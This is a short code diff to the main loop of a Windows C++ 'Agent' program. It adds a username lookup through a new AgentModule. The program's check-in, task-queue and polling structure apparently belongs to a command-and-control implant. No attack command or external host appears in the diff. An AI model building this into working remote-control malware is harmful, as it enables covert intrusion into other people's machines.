@@ -3,6 +3,7 @@
 #include "CommManager.h"
 #include "CheckinModels.h"
 #include "TaskQueueManager.h"
+#include "AgentModule.h"
 #include <windows.h>
 #include <vector>
 
@@ -75,6 +76,9 @@ std::string Agent::GetUser() const
 
 int main(int argc, char *argv[])
 {
+    LPWSTR username;
+    AgentModule agentMod;
+    agentMod.GetUsername(&username);
     std::vector<ResultRequest> taskResults;
     TaskQueueManager taskManager;
     CommManager manager = CommManager();
@@ -123,7 +127,6 @@ int main(int argc, char *argv[])
                 taskManager.StoreTaskResult(task.id, true, result);
                 break;
             }
-
         }
         Sleep(5000);
     }
